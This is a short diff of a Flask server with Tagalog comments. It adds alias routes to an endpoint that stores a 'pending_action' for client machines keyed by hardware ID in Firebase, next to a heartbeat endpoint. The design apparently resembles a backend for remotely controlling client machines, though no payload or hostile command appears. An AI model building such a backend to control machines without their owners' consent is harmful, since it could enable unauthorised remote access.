@@ -40,7 +40,10 @@ def heartbeat():
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 500
 
+# Lahat ng posibleng route variation para iwas 404
 @app.route('/api/target-action', methods=['POST', 'GET'])
+@app.route('/target-action', methods=['POST', 'GET'])
+@app.route('/action', methods=['POST', 'GET'])
 def target_action():
     try:
         data = request.get_json(silent=True)
@@ -53,7 +56,6 @@ def target_action():
         if not hwid or not action:
             return jsonify({"status": "error", "message": "Invalid HWID or action."}), 400
 
-        # Ligtas na pag-save sa Firebase node
         ref = db.reference(f'clients/{hwid}')
         ref.update({'pending_action': action})
 
